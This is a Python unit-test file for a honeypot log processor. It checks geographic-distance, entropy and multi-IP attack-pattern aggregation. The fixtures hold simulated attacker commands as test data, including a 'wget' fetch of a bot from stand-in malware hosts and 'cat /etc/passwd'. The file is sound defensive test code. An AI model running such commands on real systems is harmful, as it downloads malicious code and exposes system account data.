"""Unit tests for multi-IP feature aggregation functions."""

from __future__ import annotations

import math
from datetime import datetime, timezone
from typing import Any, Dict, Optional

import pytest

from cowrieprocessor.features.aggregation import (
    aggregate_features,
    calculate_entropy,
    calculate_geographic_spread,
    haversine_distance,
)
from cowrieprocessor.features.provider_classification import ProviderClassifier


class MockSessionSummary:
    """Mock SessionSummary for testing without database."""

    def __init__(
        self,
        enrichment: Optional[Dict[str, Any]] = None,
        updated_at: Optional[datetime] = None,
        session_id: str = "test_session",
    ):
        """Initialize mock session.

        Args:
            enrichment: Enrichment data dictionary
            updated_at: Session update timestamp
            session_id: Session identifier
        """
        self.session_id = session_id
        self.enrichment = enrichment or {}
        self.updated_at = updated_at or datetime.now(timezone.utc)


# Haversine Distance Tests


class TestHaversineDistance:
    """Test haversine distance calculations."""

    def test_identical_coordinates(self) -> None:
        """Test distance between identical coordinates is zero."""
        distance = haversine_distance(0.0, 0.0, 0.0, 0.0)
        assert distance == 0.0

        distance = haversine_distance(40.7128, -74.0060, 40.7128, -74.0060)
        assert distance == 0.0

    def test_new_york_to_london(self) -> None:
        """Test known distance: New York to London."""
        # New York: 40.7128° N, 74.0060° W
        # London: 51.5074° N, 0.1278° W
        distance = haversine_distance(40.7128, -74.0060, 51.5074, -0.1278)

        # Expected ~5570 km (within 1% tolerance)
        assert 5520 <= distance <= 5620

    def test_tokyo_to_sydney(self) -> None:
        """Test known distance: Tokyo to Sydney."""
        # Tokyo: 35.6762° N, 139.6503° E
        # Sydney: 33.8688° S, 151.2093° E
        distance = haversine_distance(35.6762, 139.6503, -33.8688, 151.2093)

        # Expected ~7823 km (within 1% tolerance)
        assert 7745 <= distance <= 7900

    def test_equator_crossing(self) -> None:
        """Test distance crossing equator."""
        # 10° N to 10° S at same longitude
        distance = haversine_distance(10.0, 0.0, -10.0, 0.0)

        # Expected ~2224 km (20 degrees latitude * ~111 km/degree)
        assert 2200 <= distance <= 2250

    def test_prime_meridian_crossing(self) -> None:
        """Test distance crossing prime meridian."""
        # Same latitude, 20° longitude difference
        distance = haversine_distance(0.0, -10.0, 0.0, 10.0)

        # Expected ~2224 km (20 degrees at equator)
        assert 2200 <= distance <= 2250

    def test_antipodal_points(self) -> None:
        """Test maximum possible distance (antipodal points)."""
        # Opposite sides of Earth
        distance = haversine_distance(0.0, 0.0, 0.0, 180.0)

        # Expected ~20037 km (half of Earth's circumference)
        assert 20000 <= distance <= 20100

    def test_none_coordinates_raises_error(self) -> None:
        """Test that None coordinates raise ValueError."""
        with pytest.raises(ValueError, match="All coordinates must be non-None"):
            haversine_distance(None, 0.0, 0.0, 0.0)  # type: ignore

        with pytest.raises(ValueError, match="All coordinates must be non-None"):
            haversine_distance(0.0, None, 0.0, 0.0)  # type: ignore

        with pytest.raises(ValueError, match="All coordinates must be non-None"):
            haversine_distance(0.0, 0.0, None, 0.0)  # type: ignore

        with pytest.raises(ValueError, match="All coordinates must be non-None"):
            haversine_distance(0.0, 0.0, 0.0, None)  # type: ignore

    def test_negative_coordinates(self) -> None:
        """Test handling of negative coordinates (Southern/Western hemispheres)."""
        # Southern hemisphere (negative latitude)
        distance = haversine_distance(-33.8688, 151.2093, -37.8136, 144.9631)
        assert distance > 0

        # Western hemisphere (negative longitude)
        distance = haversine_distance(40.7128, -74.0060, 34.0522, -118.2437)
        assert distance > 0


# Geographic Spread Tests


class TestCalculateGeographicSpread:
    """Test geographic spread calculations."""

    def test_empty_sessions(self) -> None:
        """Test empty session list returns zero."""
        spread = calculate_geographic_spread([])
        assert spread == 0.0

    def test_single_session(self) -> None:
        """Test single session returns zero."""
        session = MockSessionSummary(enrichment={"dshield": {"ip": {"latitude": 40.7128, "longitude": -74.0060}}})
        spread = calculate_geographic_spread([session])
        assert spread == 0.0

    def test_two_sessions_known_distance(self) -> None:
        """Test geographic spread with two sessions at known distance."""
        session1 = MockSessionSummary(
            enrichment={"dshield": {"ip": {"latitude": 40.7128, "longitude": -74.0060}}},
            session_id="session1",
        )
        session2 = MockSessionSummary(
            enrichment={"dshield": {"ip": {"latitude": 51.5074, "longitude": -0.1278}}},
            session_id="session2",
        )

        spread = calculate_geographic_spread([session1, session2])

        # NY to London ~5570 km
        assert 5520 <= spread <= 5620

    def test_multiple_sessions_max_distance(self) -> None:
        """Test that spread returns maximum pairwise distance."""
        sessions = [
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"latitude": 40.7128, "longitude": -74.0060}}},
                session_id="nyc",
            ),  # New York
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"latitude": 51.5074, "longitude": -0.1278}}},
                session_id="london",
            ),  # London
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"latitude": 35.6762, "longitude": 139.6503}}},
                session_id="tokyo",
            ),  # Tokyo
        ]

        spread = calculate_geographic_spread(sessions)

        # Maximum should be NYC to Tokyo or London to Tokyo (~10000+ km)
        assert spread > 10000

    def test_sessions_without_geo_data(self) -> None:
        """Test sessions without enrichment or geo data return zero."""
        sessions = [
            MockSessionSummary(enrichment={}, session_id="session1"),
            MockSessionSummary(enrichment={"dshield": {}}, session_id="session2"),
            MockSessionSummary(enrichment={"dshield": {"ip": {}}}, session_id="session3"),
        ]

        spread = calculate_geographic_spread(sessions)
        assert spread == 0.0

    def test_mixed_geo_data_availability(self) -> None:
        """Test spread calculation with some sessions missing geo data."""
        sessions = [
            MockSessionSummary(enrichment={}, session_id="no_data"),
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"latitude": 40.7128, "longitude": -74.0060}}},
                session_id="has_data1",
            ),
            MockSessionSummary(enrichment={"dshield": {"ip": {}}}, session_id="partial_data"),
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"latitude": 51.5074, "longitude": -0.1278}}},
                session_id="has_data2",
            ),
        ]

        spread = calculate_geographic_spread(sessions)

        # Should calculate distance between the two valid coordinates
        assert 5520 <= spread <= 5620

    def test_alternative_field_names(self) -> None:
        """Test compatibility with alternative lat/lon field names."""
        # Test with 'lat' and 'lon' instead of 'latitude' and 'longitude'
        sessions = [
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"lat": 40.7128, "lon": -74.0060}}}, session_id="session1"
            ),
            MockSessionSummary(enrichment={"dshield": {"ip": {"lat": 51.5074, "lon": -0.1278}}}, session_id="session2"),
        ]

        spread = calculate_geographic_spread(sessions)
        assert 5520 <= spread <= 5620

    def test_identical_coordinates(self) -> None:
        """Test that identical coordinates return zero spread."""
        sessions = [
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"latitude": 40.7128, "longitude": -74.0060}}},
                session_id="session1",
            ),
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"latitude": 40.7128, "longitude": -74.0060}}},
                session_id="session2",
            ),
        ]

        spread = calculate_geographic_spread(sessions)
        assert spread == 0.0


# Entropy Tests


class TestCalculateEntropy:
    """Test Shannon entropy calculations."""

    def test_empty_list(self) -> None:
        """Test empty list returns zero entropy."""
        entropy = calculate_entropy([])
        assert entropy == 0.0

    def test_single_value(self) -> None:
        """Test single unique value returns zero entropy."""
        entropy = calculate_entropy(["password123"])
        assert entropy == 0.0

        entropy = calculate_entropy(["password123"] * 100)
        assert entropy == 0.0

    def test_all_unique_values(self) -> None:
        """Test all unique values returns maximum entropy (1.0)."""
        entropy = calculate_entropy([1, 2, 3, 4, 5])
        assert math.isclose(entropy, 1.0, abs_tol=1e-10)

        entropy = calculate_entropy(list(range(100)))
        assert math.isclose(entropy, 1.0, abs_tol=1e-10)

    def test_two_equal_groups(self) -> None:
        """Test two equally sized groups."""
        # 50% each = maximum entropy for 2 values
        entropy = calculate_entropy(["a"] * 50 + ["b"] * 50)
        assert math.isclose(entropy, 1.0, abs_tol=1e-10)

    def test_unequal_distribution(self) -> None:
        """Test unequal distribution gives partial entropy."""
        # 90% one value, 10% another (low diversity)
        entropy = calculate_entropy(["a"] * 90 + ["b"] * 10)
        assert 0.0 < entropy < 1.0
        assert entropy < 0.6  # Should be relatively low

    def test_three_value_distribution(self) -> None:
        """Test entropy with three different values."""
        # Equal distribution
        entropy_equal = calculate_entropy(["a"] * 33 + ["b"] * 33 + ["c"] * 34)
        assert math.isclose(entropy_equal, 1.0, abs_tol=0.01)

        # Unequal distribution
        entropy_unequal = calculate_entropy(["a"] * 70 + ["b"] * 20 + ["c"] * 10)
        assert 0.0 < entropy_unequal < 1.0
        assert entropy_unequal < entropy_equal

    def test_none_values_filtered(self) -> None:
        """Test that None values are filtered out before calculation."""
        entropy = calculate_entropy([1, 2, None, 3, None])
        assert math.isclose(entropy, 1.0, abs_tol=1e-10)

        entropy = calculate_entropy([None, None])
        assert entropy == 0.0

        entropy = calculate_entropy(["a", None, "a", None])
        assert entropy == 0.0

    def test_string_values(self) -> None:
        """Test entropy calculation with string values."""
        passwords = ["password", "123456", "admin", "password", "123456"]
        entropy = calculate_entropy(passwords)

        # 3 unique values, unequal distribution
        assert 0.0 < entropy < 1.0

    def test_numeric_values(self) -> None:
        """Test entropy calculation with numeric values."""
        numbers = [1, 2, 3, 1, 2, 3, 1, 2, 3]
        entropy = calculate_entropy(numbers)

        # 3 unique values, equal distribution
        assert math.isclose(entropy, 1.0, abs_tol=0.01)

    def test_mixed_types(self) -> None:
        """Test entropy with mixed hashable types."""
        mixed = [1, "a", 2, "b", 3, "c"]
        entropy = calculate_entropy(mixed)

        # All unique
        assert math.isclose(entropy, 1.0, abs_tol=1e-10)


# Aggregate Features Tests


@pytest.fixture
def mock_classifier() -> ProviderClassifier:
    """Create a mock ProviderClassifier for testing."""
    config = {
        "use_dshield": True,
        "use_spur": True,
        "max_enrichment_age_days": 365,
        "treat_stale_as_unknown": False,
        "cloud_provider_keywords": ["amazon", "aws", "google", "azure"],
    }
    return ProviderClassifier(config)


class TestAggregateFeatures:
    """Test feature aggregation across sessions."""

    def test_empty_sessions(self, mock_classifier: ProviderClassifier) -> None:
        """Test aggregation with empty session list."""
        features = aggregate_features([], mock_classifier)

        assert features["ip_count"] == 0
        assert features["session_count"] == 0
        assert features["avg_sessions_per_ip"] == 0.0
        assert features["geographic_spread_km"] == 0.0
        assert features["password_entropy"] == 0.0
        assert features["username_entropy"] == 0.0
        assert features["cloud_provider_ratio"] == 0.0
        assert features["vpn_provider_ratio"] == 0.0
        assert features["tor_exit_ratio"] == 0.0
        assert features["avg_dshield_score"] == 0.0
        assert features["total_commands"] == 0
        assert features["unique_commands"] == 0
        assert features["command_diversity"] == 0.0

    def test_single_session(self, mock_classifier: ProviderClassifier) -> None:
        """Test aggregation with single session."""
        session = MockSessionSummary(
            enrichment={
                "dshield": {"ip": {"ip": "1.2.3.4", "attacks": "100"}},
                "spur": {},
            }
        )

        features = aggregate_features([session], mock_classifier)

        assert features["ip_count"] == 1
        assert features["session_count"] == 1
        assert features["avg_sessions_per_ip"] == 1.0
        assert features["geographic_spread_km"] == 0.0

    def test_snowshoe_pattern(self, mock_classifier: ProviderClassifier) -> None:
        """Test detection of snowshoe spam pattern (many IPs, high diversity)."""
        # Create 50 sessions from different IPs with diverse behavior
        sessions = []
        for i in range(50):
            enrichment = {
                "dshield": {
                    "ip": {
                        "ip": f"192.168.{i // 256}.{i % 256}",
                        "asname": "AMAZON-02",
                        "attacks": str(10 + i),
                        "latitude": 40.0 + i * 0.5,
                        "longitude": -74.0 + i * 0.5,
                    }
                },
                "spur": {"infrastructure": "DATACENTER"},
                "credentials": {
                    "passwords": [f"password{i}"],
                    "usernames": [f"user{i}"],
                },
                "commands": ["ls -la", f"wget http://malware{i}.com/bot"],
            }
            sessions.append(MockSessionSummary(enrichment=enrichment, session_id=f"session_{i}"))

        features = aggregate_features(sessions, mock_classifier)

        # Snowshoe characteristics
        assert features["ip_count"] == 50
        assert features["session_count"] == 50
        assert features["avg_sessions_per_ip"] == 1.0  # One session per IP
        assert features["geographic_spread_km"] > 0  # Geographic distribution
        assert features["password_entropy"] > 0.95  # High password diversity
        assert features["username_entropy"] > 0.95  # High username diversity
        assert features["cloud_provider_ratio"] > 0.9  # Mostly cloud providers

    def test_focused_attack_pattern(self, mock_classifier: ProviderClassifier) -> None:
        """Test detection of focused attack pattern (single IP, repetitive)."""
        # Create 50 sessions from same IP with repetitive behavior
        # Use same password across most sessions to get low entropy
        sessions = []
        for i in range(50):
            enrichment = {
                "dshield": {"ip": {"ip": "1.2.3.4", "attacks": "500"}},
                "spur": {},
                "credentials": {
                    # Mostly repeated passwords - 90% "admin", 10% "root"
                    "passwords": ["admin"] if i < 45 else ["root"],
                    "usernames": ["root"] if i < 45 else ["admin"],
                },
                "commands": ["ls", "pwd", "whoami"],  # Repeated commands
            }
            sessions.append(MockSessionSummary(enrichment=enrichment, session_id=f"session_{i}"))

        features = aggregate_features(sessions, mock_classifier)

        # Focused attack characteristics
        assert features["ip_count"] == 1
        assert features["session_count"] == 50
        assert features["avg_sessions_per_ip"] == 50.0  # Many sessions per IP
        assert features["geographic_spread_km"] == 0.0  # No geographic spread
        # With 90/10 split, entropy should be low (around 0.47)
        assert features["password_entropy"] < 0.6  # Low password diversity
        assert features["username_entropy"] < 0.6  # Low username diversity

    def test_cloud_provider_detection(self, mock_classifier: ProviderClassifier) -> None:
        """Test cloud provider ratio calculation."""
        sessions = [
            MockSessionSummary(
                enrichment={
                    "dshield": {"ip": {"ip": "1.2.3.4", "asname": "AMAZON-02"}},
                    "spur": {},
                },
                session_id="session1",
            ),
            MockSessionSummary(
                enrichment={
                    "dshield": {"ip": {"ip": "5.6.7.8", "asname": "GOOGLE"}},
                    "spur": {},
                },
                session_id="session2",
            ),
            MockSessionSummary(
                enrichment={
                    "dshield": {"ip": {"ip": "9.10.11.12", "asname": "COMCAST"}},
                    "spur": {},
                },
                session_id="session3",
            ),
        ]

        features = aggregate_features(sessions, mock_classifier)

        # 2 out of 3 are cloud providers
        assert 0.6 <= features["cloud_provider_ratio"] <= 0.7

    def test_vpn_detection(self, mock_classifier: ProviderClassifier) -> None:
        """Test VPN provider ratio calculation."""
        sessions = [
            MockSessionSummary(
                enrichment={
                    "dshield": {"ip": {"ip": "1.2.3.4"}},
                    "spur": {"infrastructure": "VPN"},
                },
                session_id="session1",
            ),
            MockSessionSummary(
                enrichment={
                    "dshield": {"ip": {"ip": "5.6.7.8"}},
                    "spur": {},
                },
                session_id="session2",
            ),
        ]

        features = aggregate_features(sessions, mock_classifier)

        # 1 out of 2 is VPN
        assert features["vpn_provider_ratio"] == 0.5

    def test_dshield_score_averaging(self, mock_classifier: ProviderClassifier) -> None:
        """Test DShield attack count averaging."""
        sessions = [
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"ip": "1.2.3.4", "attacks": "100"}}}, session_id="session1"
            ),
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"ip": "5.6.7.8", "attacks": "200"}}}, session_id="session2"
            ),
            MockSessionSummary(
                enrichment={"dshield": {"ip": {"ip": "9.10.11.12", "attacks": "300"}}}, session_id="session3"
            ),
        ]

        features = aggregate_features(sessions, mock_classifier)

        # Average of 100, 200, 300 = 200
        assert features["avg_dshield_score"] == 200.0

    def test_missing_enrichment_graceful_handling(self, mock_classifier: ProviderClassifier) -> None:
        """Test that missing enrichment data is handled gracefully."""
        sessions = [
            MockSessionSummary(enrichment={}, session_id="session1"),
            MockSessionSummary(enrichment={"dshield": {}}, session_id="session2"),
            MockSessionSummary(enrichment={"dshield": {"ip": {}}}, session_id="session3"),
        ]

        features = aggregate_features(sessions, mock_classifier)

        # Should not crash, should return zeros/empty values
        assert features["ip_count"] == 0
        assert features["geographic_spread_km"] == 0.0
        assert features["avg_dshield_score"] == 0.0

    def test_command_diversity(self, mock_classifier: ProviderClassifier) -> None:
        """Test command diversity calculation."""
        sessions = [
            MockSessionSummary(
                enrichment={
                    "dshield": {"ip": {"ip": "1.2.3.4"}},
                    "commands": ["ls", "pwd", "whoami", "cat /etc/passwd"],
                },
                session_id="session1",
            ),
            MockSessionSummary(
                enrichment={
                    "dshield": {"ip": {"ip": "5.6.7.8"}},
                    "commands": ["ls", "pwd"],  # Repeated commands
                },
                session_id="session2",
            ),
        ]

        features = aggregate_features(sessions, mock_classifier)

        assert features["total_commands"] == 6
        assert features["unique_commands"] == 4  # ls, pwd, whoami, cat
        assert 0.0 < features["command_diversity"] < 1.0
